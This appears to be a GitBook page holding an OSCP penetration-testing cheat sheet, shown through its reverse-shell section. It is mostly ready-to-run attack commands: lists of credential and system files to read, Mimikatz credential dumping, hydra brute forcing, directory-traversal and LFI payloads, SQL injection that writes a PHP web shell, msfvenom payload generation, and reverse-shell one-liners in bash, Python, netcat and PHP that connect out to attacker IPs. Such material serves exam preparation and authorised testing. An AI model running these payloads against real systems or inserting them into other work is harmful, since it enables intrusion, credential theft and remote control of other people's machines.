---
icon: explosion
cover: ../.gitbook/assets/Screenshot 2025-08-14 155714.png
coverY: 0
layout:
  width: default
  cover:
    visible: true
    size: full
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# OSCP CheatSheet

## OSCP Cheatsheet



### Table of Contents

*   **General**

    ◦ Important Locations

    ◦ File Transfers

    ▪ Windows to Kali

    ◦ Adding Users

    ▪ Windows

    ▪ Linux

    ◦ Password-Hash Cracking

    ▪ fcrackzip

    ▪ John

    ▪ Hashcat

    ◦ Mimikatz

    ◦ Ligolo-ng
*   **Recon and Enumeration**

    ◦ Port Scanning

    ◦ FTP enumeration

    ◦ SSH enumeration

    ◦ SMB enumeration

    ◦ HTTP/S enumeration

    ▪ Wordpress

    ▪ Drupal

    ▪ Joomla

    ◦ DNS enumeration

    ◦ SMTP enumeration

    ◦ LDAP Enumeration

    ◦ NFS Enumeration

    ◦ SNMP Enumeration

    ◦ RPC Enumeration
*   **Web Attacks**

    ◦ Directory Traversal

    ◦ Local File Inclusion

    ◦ SQL Injection
*   **Exploitation**

    ◦ Reverse Shells

    ▪ Msfvenom

    ▪ One Liners

    ▪ Groovy reverse-shell

    ◦ Windows Privilege Escalation

    ▪ Basic

    ▪ Automated Scripts

    ▪ Token Impersonation

    ▪ Services

    * Binary Hijacking
    * Unquoted Service Path
    * Insecure Service Executables
    * Weak Registry permissions

    ▪ DLL Hijacking

    ▪ Autorun

    ▪ AlwaysInstallElevated

    ▪ Schedules Tasks

    ▪ Startup Apps

    ▪ Insecure GUI apps

    ▪ Passwords

    * Sensitive files
    * Config files
    * Registry
    * RunAs - Savedcreds
    * Pass the Hash

    ▪ Linux Privilege Escalation

    * TTY Shell
    * Basic
    * Automated Scripts
    * Sensitive Information
    * Sudo/SUID/Capabilities
    * Cron Jobs
    * NFS

    ▪ Post Exploitation

    *   Sensitive Information

        ◦ Powershell History

        ◦ Searching for passwords

        ◦ Searching in Registry for Passwords

        ◦ KDBX Files
    * Dumping Hashes

    ▪ Active Directory Pentesting

    *   Enumeration

        ◦ Powerview

        ◦ Bloodhound

        ◦ PsLoggedon
    *   Attacking Active Directory Authentication

        ◦ Password Spraying

        ◦ AS-REP Roasting

        ◦ Kerberoasting

        ◦ Silver Tickets
    * Secretsdump

    ▪ Lateral Movement in Active Directory

    * psexec - smbexec - wmiexec - atexec
    * winrs
    * crackmapexec
    * Pass the ticket
    * Golden Ticket

### General

#### Important Locations

**Windows**

```
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

**Linux**

```
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_[key.pub](http://key.pub)
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_[key.pub](http://key.pub)
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<pid>/cmdline
/proc/<pid>/maps
/proc/sched_debug
/proc/self/cwd/[app.py](http://app.py)
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/[pure-config.pl](http://pure-config.pl)
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/[pure-config.pl](http://pure-config.pl)
/var/adm/log/xferlog
/var/apache2/[config.inc](http://config.inc)
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/[mail.info](http://mail.info)
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
#id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa
~/.ssh/id_dsa
~/.ssh/id_[dsa.pub](http://dsa.pub)
~/.ssh/id_rsa
~/.ssh/id_edcsa
~/.ssh/id_[rsa.pub](http://rsa.pub)
~/.ssh/identity
~/.ssh/[identity.pub](http://identity.pub)
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

#### File Transfers

**Downloading on Windows**

```bash
powershell -command Invoke-WebRequest -Uri [http://IP:PORT/file](http://IP:PORT/file) -Outfile C:\temp\file
```

```powershell
iwr -uri URL -Outfile file
```

```bash
certutil -urlcache -split -f "URL" outputfilename
```

```bash
copy \\kali.IP\share\file C:\temp\file
```

**Downloading on Linux**

```bash
wget URL -O OUTPUT_FILE
```

```bash
curl [http://IP:PORT/file](http://IP:PORT/file) > <OUTPUT_FILE>
```

#### Windows to Kali

```bash
# Kali
impacket-smbserver -smb2support SHARE_NAME .
```

```bash
# Windows
copy file \\KaliIP\SHARE_NAME\
```

#### Adding Users

#### Windows

```bash
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
```

#### Linux

```bash
adduser username  #Interactive
useradd username
useradd -u UID -g GID username  #UID can be something new than existing
```

#### Password-Hash Cracking

**Hash Analyzer:** [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/) fcrackzip fcrackzip

#### fcrackzip

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt [file.zip](http://file.zip)  #Cracking zip files
```

#### John

[https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run) [ssh2john.py](http://ssh2john.py)

```bash
ssh2john id_rsa > hash
#Convert the obtained hash to John format(above link)
john hashfile --wordlist=rockyou.txt
```

#### Hashcat

[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) #Obtain - Find the Hash module number

```bash
hashcat -m MODULE_NUMBER hash wordlists.txt --force
```

#### Mimikatz

```
privilege::debug
sekurlsa::logonpasswords  #hashes and plaintext passwords
lsadump::sam
lsadump::lsa /patch  #both these dump SAM
#OneLiner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### Ligolo-ng

```bash
#Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

#Kali machine - Attacker machine
./proxy -laddr 0.0.0.0:9001 -selfcert

#windows or linux machine - compromised machine
./agent -connect KALI_IP:9001 -ignore-cert

#In Ligolo-ng console
session #select host
ifconfig #Notedown the internal network's subnet
start #after adding relevent subnet to ligolo interface

#Adding subnet to ligolo interface - Kali linux
sudo ip r add SUBNET/MASK dev ligolo
```

### Recon and Enumeration

#### OSINT OR Passive Recon

💡 Not that useful for OSCP as we'll be dealing with internal machines

```bash
whois DOMAIN
whois DOMAIN -h WHOIS_SERVER
```

**Google dorking:**

* site:
* filetype:
* intitle:
* GHDB - Google hacking database

**OS and Service Information using** [searchdns.netcraft.com](http://searchdns.netcraft.com)

**Github dorking:**

* filename:
* user:
* A tool called Gitleaks for automated enumeration

**Shodan dorks:**

* hostname:
* port:
* Then gather info by going through the options

**Scanning Security headers and SSL/TLS using** [https://securityheaders.com/](https://securityheaders.com/) Port

#### Port Scanning

```bash
#use -Pn option if you're getting nothing in scan
nmap -sC -sV TARGET_IP -v  #Basic scan
nmap -T4 -A -p- TARGET_IP -v  #complete scan
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124  #running vuln category scripts

#NSE
updatedb
locate .nse | grep SEARCH_TERM
sudo nmap --script="name" TARGET_IP  #here we can specify other options like specific ports

# PowerShell
Test-NetConnection -Port PORT_NUMBER TARGET_IP
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"}
```

#### FTP Enumeration

```bash
ftp TARGET_IP
#login if you have relevant creds or based on nmap scan find out whether this has anonymous access

# Commands within FTP
put LOCAL_FILE  #uploading file
get REMOTE_FILE  #downloading file

#NSE
locate .nse | grep ftp
nmap -p21 --script=SCRIPT_NAME TARGET_IP

#bruteforce
hydra -L users.txt -P passwords.txt TARGET_IP ftp  #'-L' for usernames list, '-l' for username
#check for vulnerabilities associated with the version identified.
```

#### SSH Enumeration

```bash
#Login
ssh username@IP  #enter password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh username@IP -i id_rsa/id_ecdsa  #if it still asks for password, crack them using John

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa > hash
# OR
ssh2john id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce
hydra -l username -P passwords.txt TARGET_IP ssh  #'-L' for usernames list, '-l' for username
#check for vulnerabilities associated with the version identified.
```

#### SMB Enumeration

```bash
sudo nbtscan -r 192.168.50.0/24  #IP or range can be provided

#NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" $IP

#In windows we can view like this
net view \\TARGET_IP /all

#crackmapexec
crackmapexec smb TARGET_IP
crackmapexec smb 192.168.1.100 -u username -p password
crackmapexec smb 192.168.1.100 -u username -p password --shares  #lists available shares
crackmapexec smb 192.168.1.100 -u username -p password --users  #lists users
crackmapexec smb 192.168.1.100 -u username -p password --all  #all information
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares  #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares  #specific domain
#In place of username and password, we can include usernames.txt and passwords.txt for pass spraying
```

**Smbclient**

```bash
smbclient -L //IP  #or try with 4 /'s
smbclient //server/share
smbclient //server/share -U USERNAME
smbclient //server/share -U domain/username

#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u USERNAME -p PASSWORD
smbmap -H <target_ip> -u USERNAME -p PASSWORD -d DOMAIN
smbmap -H <target_ip> -u USERNAME -p PASSWORD -r <share_name>

#Within SMB session
put LOCAL_FILE  #to upload file
get REMOTE_FILE  #to download file
```

**Downloading shares made easy** - if the folder consists of several files, they all be downloading by this.

```bash
mask ""
recurse ON
prompt OFF
mget *
```

#### HTTP/S Enumeration

* View source-code and identify any hidden content. If some image looks suspicious download and try to find hidden data in it.
* Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
* check `/robots.txt` folder
* Look for the hostname and add the relevant one to `/etc/hosts` file.
* Directory and file discovery - Obtain any hidden files which may contain juicy information

```bash
dirbuster
gobuster dir -u [http://example.com](http://example.com) -w /path/to/wordlist.txt
python3 [dirsearch.py](http://dirsearch.py) -u [http://example.com](http://example.com) -w /path/to/wordlist.txt
```

* Vulnerability Scanning using nikto:

```bash
nikto -h TARGET_IP
```

* SSL certificate inspection, this may reveal information like subdomains, usernames…etc
* Default credentials, Identify the CMS or service and check for default credentials and test them out.
* Bruteforce

```bash
hydra -L users.txt -P password.txt TARGET_IP http-{post/get}-form "/path:name=USER&pass=PASS:invalid"
```

* Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also check the failed-login message and replace "invalid" with that message.

**#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!**

* if `cgi-bin` is present then do further fuzzing and obtain files like `.sh` or `.pl`
* Check if other services like FTP/SMB or any others which has upload privileges are getting reflected on web.
* API - Fuzz further and it can reveal some sensitive information

```bash
#identifying endpoints using gobuster
gobuster dir -u [http://192.168.50.16:5002](http://192.168.50.16:5002) -w /usr/share/wordlists/dirb/big.txt -p pattern

#obtaining info using curl
curl -i [http://192.168.50.16:5002/users/v1<br>•/api/endpoint](http://192.168.50.16:5002/users/v1<br>•/api/endpoint)
```

If there is any Input field check for Remote Code execution or SQL Injection

* Check the URL, whether we can leverage Local or Remote File Inclusion.
* Also check if there's any file upload utility(also obtain the location it's getting reflected)

#### Wordpress

```bash
# basic usage
wpscan --url "target" --verbose

# enumerate vulnerable plugins, users, vulnerable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
```

* Add Wpscan API to get the details of vulnerabilities.

#### Drupal

```bash
droopescan scan drupal -u [http://site](http://site)
```

#### Joomla

```bash
droopescan scan joomla --url [http://site](http://site)
sudo python3 [joomla-brute.py](http://joomla-brute.py) -u [http://site/](http://site/) -w passwords.txt -usr username  #[https://github.com/ajnik/joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
```

#### DNS Enumeration

```bash
host [www.megacorpone.com](http://www.megacorpone.com)
host -t mx [megacorpone.com](http://megacorpone.com)
host -t txt [megacorpone.com](http://megacorpone.com)

for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"  #bash bruteforce

dnsrecon -d [megacorpone.com](http://megacorpone.com) -t std  #standard recon
dnsrecon -d [megacorpone.com](http://megacorpone.com) -D ~/list.txt -t brt  #bruteforce, hence we provided list

dnsenum [megacorpone.com](http://megacorpone.com)

nslookup [mail.megacorptwo.com](http://mail.megacorptwo.com)
nslookup -type=TXT [info.megacorptwo.com](http://info.megacorptwo.com) 192.168.50.151  #we're querying with a specific IP
```

#### SMTP Enumeration

```bash
nc -nv TARGET_IP 25  #Version Detection
smtp-user-enum -M VRFY -U username.txt -t TARGET_IP  # -M means mode, it can be RCPT, VRFY, EXPN

#Sending email with valid credentials, the below is an example for Phishing mail attack
sudo swaks -t [user1@test.com](mailto:user1@test.com) -t [user2@test.com](mailto:user2@test.com) --from [user3@test.com](mailto:user3@test.com) --server <mailserver> --auth --username <username> --password <password> --h-Subject "Subject" --body "Body"
```

#### LDAP Enumeration

```bash
ldapsearch -x -H ldap://TARGET_IP -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b"CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b "CN=Domain Admins,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b"CN=Domain Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b "CN=Enterprise Admins,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b"CN=Administrators,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://TARGET_IP -D '<username>' -w '<password>' -b "CN=Remote Desktop Users,DC=<1_SUBDOMAIN>,DC=<TLD>"

#[windapsearch.py](http://windapsearch.py)
#for computers
python3 [windapsearch.py](http://windapsearch.py) --dc-ip DC_IP -u USERNAME -p PASSWORD --computers

#for groups
python3 [windapsearch.py](http://windapsearch.py) --dc-ip DC_IP -u USERNAME -p PASSWORD --groups

#for users
python3 [windapsearch.py](http://windapsearch.py) --dc-ip DC_IP -u USERNAME -p PASSWORD --da

#for privileged users
python3 [windapsearch.py](http://windapsearch.py) --dc-ip DC_IP -u USERNAME -p PASSWORD --privileged-users
```

#### NFS Enumeration

```bash
nmap -sV --script=nfs-showmount TARGET_IP
showmount -e TARGET_IP
```

#### SNMP Enumeration

```bash
snmpcheck -t TARGET_IP -c public
snmpwalk -c public -v1 -t 10 TARGET_IP
snmpenum -t TARGET_IP
```

#### RPC Enumeration

```bash
rpcclient -U=user $DCIP
rpcclient -U="" $DCIP  #Anonymous login

##Commands within RPCclient
srvinfo
enumdomusers  #users
enumpriv  #like "whoami /priv"
queryuser <RID>  #detailed user info
getuserdompwinfo <RID>  #password policy, get user-RID from previous command
lookupnames <username>  #SID of specified user
createdomuser <username>  #Creating a user
deletedomuser <username>
enumdomains
enumdomgroups
querygroup <GROUP_RID>  #get rid from previous command
querydispinfo  #description of all users
netshareenum  #Share enumeration, this only comes up if the current user we're logged in has permission
netshareenumall
lsaenumsid  #SID of all users
```

### Web Attacks

💡 Cross-platform PHP reverse shell: [https://github.com/ivan-sincek/php-reverse-](https://github.com/ivan-sincek/php-reverse-)

#### Directory Traversal

```bash
cat /etc/passwd  #displaying content through absolute path
cat ../../../etc/passwd  #relative path
```

* if the pwd is `/var/log/` then in order to view the `/etc/passwd` it will be like this

```bash
cat ../../etc/passwd
```

* In web it should be exploited like this, find a parameters and test it out

```
[http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd?page=../../../etc/passwd](http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd?page=../../../etc/passwd)
#check for id_rsa, id_ecdsa
```

* If the output is not getting formatted properly then,

```bash
curl [http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/pas<br>•?page=../../../etc/passwd](http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/pas<br>•?page=../../../etc/passwd)
```

* For windows

```
[http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/instal<br>•?page=../../../windows/system32/drivers/etc/hosts](http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/instal<br>•?page=../../../windows/system32/drivers/etc/hosts)
```

**URL Encoding**

Sometimes it doesn't show if we try path, then we need to encode them

```bash
curl [http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>•?page=..%2F..%2F..%2Fetc%2Fpasswd](http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<br>•?page=..%2F..%2F..%2Fetc%2Fpasswd)
```

**Wordpress**

Simple exploit: [https://github.com/leonjza/wordpress-shell](https://github.com/leonjza/wordpress-shell) Local

#### Local File Inclusion

* Main difference between Directory traversal and this attack is, here we're able to execute commands remotely.

At first we need to check if we can include log files

```
[http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.lo<br>#Reverse?page=/var/log/apache2/access.log&cmd=whoami](http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.lo<br>#Reverse?page=/var/log/apache2/access.log&cmd=whoami)
```

If RCE via LFI is possible then we can put reverse shells

```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22  #encoded
```

**PHP wrapper**

```bash
curl "[http://mountaindesserts.com/meteor/index.php?page=data://text/plain?page=php://filter/convert.base64-encode/resource=index.php](http://mountaindesserts.com/meteor/index.php?page=data://text/plain?page=php://filter/convert.base64-encode/resource=index.php)"
```

#### SQL Injection

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth  #To login
```

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#Now we can run commands
EXECUTE xp_cmdshell 'whoami';
```

Sometimes we may not have direct access to convert it to RCE from web, then follow below

```sql
UNION SELECT "<?php system($_GET['cmd']); ?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php"
```

Now we can exploit it

```
[http://192.168.45.285/tmp/webshell.php?cmd=id](http://192.168.45.285/tmp/webshell.php?cmd=id)  #Command execution
```

**SQLMap - Automated Code execution**

```bash
sqlmap -u [http://192.168.50.19/blindsqli.php?user=1](http://192.168.50.19/blindsqli.php?user=1) -p user  #Testing on parameter names "user"
sqlmap -u [http://192.168.50.19/blindsqli.php?user=1](http://192.168.50.19/blindsqli.php?user=1) -p user --dump  #Dumping database

#OS Shell
```

* Obtain the Post request from Burp suite and save it to post.txt

```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"  #/var/www/html/tmp is the writable location on web
```

### Exploitation

#### Reverse Shells

#### Msfvenom

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell-x64.exe
msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war > shell.war
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php
```

#### One Liners

```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

```python
python -c 'import socket,os,pty;s=socket.socket([socket.AF](http://socket.AF)_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

```bash
nc -e /bin/sh 10.0.0.1 4242
```

```bash
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done
```

```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.11.0.106/443 0>&1'");?>
```

**#For powershell use the encrypted tool that's in Tools folder**

